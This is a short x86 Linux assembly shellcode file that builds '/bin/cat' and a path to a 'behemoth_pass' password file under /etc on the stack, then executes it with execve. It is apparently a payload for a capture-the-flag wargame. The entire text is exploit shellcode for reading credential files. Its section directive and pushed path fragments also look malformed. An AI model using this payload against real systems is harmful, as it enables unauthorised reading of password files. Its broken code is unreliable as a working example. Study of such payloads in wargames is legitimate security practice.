section .data
section.txt
global _start
_start:
	sub    ecx,ecx
	push   ecx
	push   0x7461632f
	push   0x6e69622f
	mov    ebx,esp
	push   ecx
	push   0x65686562
	push   0x68746f6d
	push   0x7361705f
	push   0x73000000
	push   0x65686562
	push   0x68746f6d
	push   0x7361705f
	push   0x00000073
	push   0x6374652f
	mov    ecx,esp
	push   0xb
	pop    eax
	push   0x0
	push   ecx
	push   ebx
	mov    ecx,esp
	int    0x80